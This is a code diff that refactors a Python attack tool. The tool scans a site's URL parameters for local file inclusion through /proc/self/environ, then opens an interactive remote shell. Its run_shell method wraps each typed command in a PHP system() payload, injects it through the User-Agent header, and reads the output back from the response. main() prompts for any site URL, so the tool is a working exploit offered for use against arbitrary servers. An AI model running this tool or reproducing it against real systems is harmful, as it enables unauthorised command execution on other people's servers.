@@ -1,53 +1,33 @@
-import re
 import os
+import re
 import random
 import string
-import requests
 import urllib.parse
 
-from rich.console import Console
 from rich.progress import Progress
-from prompt_toolkit import PromptSession
-from prompt_toolkit.formatted_text import HTML
-from prompt_toolkit.history import InMemoryHistory
-from urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+from core.base import BaseChecker
 
-class EnvironChecker:
+
+class EnvironChecker(BaseChecker):
     def __init__(self, url, depth=10, silent=False):
-        self.console = Console()
-        self.url =self.ensure_correct_protocol(url)
+        super().__init__(url, silent)
         self.depth = depth
-        self.silent = silent
         self.return_filepath = None
         self.random_user_agent = self._generate_random_string()
         self.LFI_TEST_FILES = [
             ('/proc/self/environ', re.compile(fr'{self.random_user_agent}')),
         ]
         self.HTTP_HEADERS = [
-        "HTTP_USER_AGENT",
-        "HTTP_ACCEPT",
-        "HTTP_ACCEPT_ENCODING",
-        "HTTP_ACCEPT_LANGUAGE",
-        "HTTP_REFERER",
-        "HTTP_CONNECTION",
-        "HTTP_COOKIE",
+            "HTTP_USER_AGENT",
+            "HTTP_ACCEPT",
+            "HTTP_ACCEPT_ENCODING",
+            "HTTP_ACCEPT_LANGUAGE",
+            "HTTP_REFERER",
+            "HTTP_CONNECTION",
+            "HTTP_COOKIE",
         ]
-    
-    def ensure_correct_protocol(self, url):
-        if not url.startswith(('http://', 'https://')):
-            try:
-                requests.get('https://' + url, timeout=3, verify=False)
-                return 'https://' + url
-            except requests.exceptions.RequestException:
-                try:
-                    requests.get('http://' + url, timeout=3, verify=False)
-                    return 'http://' + url
-                except requests.exceptions.RequestException:
-                    pass
-        return url
-        
+
     def _generate_random_string(self, length=10):
         return ''.join(random.choice(string.ascii_letters) for _ in range(length))
 
@@ -69,9 +49,9 @@ class EnvironChecker:
 
         return self._scan(params, file_paths, parsed_url)
 
-    def _scan(self, params, file_paths, parsed_url,  total_operations=None, progress=None):
+    def _scan(self, params, file_paths, parsed_url, total_operations=None, progress=None):
         task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None
-        
+
         headers = {'User-Agent': self.random_user_agent}
 
         for param_name in params.keys():
@@ -80,16 +60,9 @@ class EnvironChecker:
                 new_params[param_name] = file_path
                 new_query = urllib.parse.urlencode(new_params, doseq=True)
                 fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-                
-                try:
-                    response = requests.get(fuzzed_url, headers=headers, timeout=5, verify=False)
-                except requests.exceptions.ConnectionError:
-                    if not self.silent:
-                        self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                    return False, None    
-                except requests.exceptions.RequestException:
-                    if not self.silent:
-                        self.console.print("[bold red]Request Timeout Error (WAF or down host)...[/bold red]")
+
+                response = self._safe_get(fuzzed_url, headers=headers)
+                if response is None:
                     return False, None
 
                 if any(header in response.text for header in self.HTTP_HEADERS):
@@ -98,13 +71,14 @@ class EnvironChecker:
                         if not self.silent:
                             self.console.print('\n[bold red]Possible LFI2RCE detected (proc_self_environ: method)[/bold red] (/proc/self/environ method)', style='bold red')
                         return True, param_name
-                
+
                 if progress:
                     progress.update(task, advance=1)
 
         return False, None
-    
+
     def run_shell(self, param_name):
+        """Custom shell - injects commands via User-Agent header (POST)."""
         self.silent = True
         result, param_name = self.environ_check()
 
@@ -117,28 +91,27 @@ class EnvironChecker:
             fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
             self.console.print("[bold yellow]Interactive shell is ready. Type your commands.[/bold yellow]")
 
-            session = PromptSession(history=InMemoryHistory())        
+            from prompt_toolkit import PromptSession
+            from prompt_toolkit.formatted_text import HTML
+            from prompt_toolkit.history import InMemoryHistory
+
+            session = PromptSession(history=InMemoryHistory())
             while True:
                 try:
                     cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
-                    if "exit" in cmd:
-                        raise KeyboardInterrupt
-                    elif not cmd:
+                    if not cmd:
                         continue
-                    elif "clear" in cmd:
-                        if os.name == 'posix':
-                            os.system('clear')
-                        elif os.name == 'nt':
-                            os.system('cls')
+                    if cmd.strip().lower() in ("exit", "quit"):
+                        raise KeyboardInterrupt
+                    if cmd.strip().lower() in ("clear", "cls"):
+                        os.system("cls" if os.name == "nt" else "clear")
                         continue
 
-                    cmd = f"<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
-                    headers = {'User-Agent': cmd}
-                    
-                    try:
-                        response = requests.post(fuzzed_url, headers=headers, verify=False)
-                    except requests.exceptions.ConnectionError:
-                        self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
+                    php_cmd = f"<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
+                    headers = {'User-Agent': php_cmd}
+
+                    response = self._safe_post(fuzzed_url, headers=headers)
+                    if response is None:
                         continue
 
                     pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
@@ -148,22 +121,22 @@ class EnvironChecker:
                         self.console.print(f"[bold green]{shell_output}[/bold green]")
                     else:
                         self.console.print("[bold red]No shell output.[/bold red]")
-                    
+
                 except KeyboardInterrupt:
                     self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
-                    break          
+                    break
 
         return None
+
 
 def main():
     url = input('Enter site URL to test: ')
     checker = EnvironChecker(url, silent=True)
     output, param_name = checker.environ_check()
-    
+
     if output is not None:
         checker.run_shell(param_name)
-    
+
 
 if __name__ == "__main__":
     main()
-
